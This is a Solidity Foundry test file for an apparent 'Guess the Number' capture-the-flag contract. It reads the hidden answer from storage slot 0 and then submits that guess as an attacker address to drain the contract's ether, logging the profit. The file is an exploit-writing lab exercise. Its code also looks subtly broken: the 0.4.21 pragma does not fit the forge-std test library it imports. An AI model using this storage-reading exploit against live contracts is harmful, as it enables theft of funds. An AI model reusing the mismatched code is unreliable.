// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "forge-std/Test.sol";
import "./GuessTheNumber.sol";

contract GuessTheNumberTest is Test {
    GuessTheNumberChallenge public challenge;
    address public attacker;
    
    function setUp() public {
        // Deploy challenge with 0.00001 ether
        challenge = (new GuessTheNumberChallenge).value(0.00001 ether)();
        attacker = address(0x1234);
        vm.deal(attacker, 1 ether);
    }
    
    function testReadAnswerFromStorage() public {
        // Read answer directly from storage slot 0
        bytes32 answerSlot = vm.load(address(challenge), bytes32(uint256(0)));
        uint8 answer = uint8(uint256(answerSlot));
        
        assertEq(answer, 42);
        console.log("Answer read from storage:", answer);
    }
    
    function testExploitWithKnownAnswer() public {
        vm.startPrank(attacker);
        
        uint256 balanceBefore = attacker.balance;
        
        // Exploit: guess the known answer
        challenge.guess.value(0.00001 ether)(42);
        
        uint256 balanceAfter = attacker.balance;
        
        // Verify we made profit
        assertGt(balanceAfter, balanceBefore);
        assertTrue(challenge.isComplete());
        
        console.log("Balance before:", balanceBefore);
        console.log("Balance after:", balanceAfter);
        console.log("Profit:", balanceAfter - balanceBefore);
        
        vm.stopPrank();
    }
    
    function testFailGuessWrongAnswer() public {
        vm.prank(attacker);
        challenge.guess.value(0.00001 ether)(41); // Wrong answer
    }
}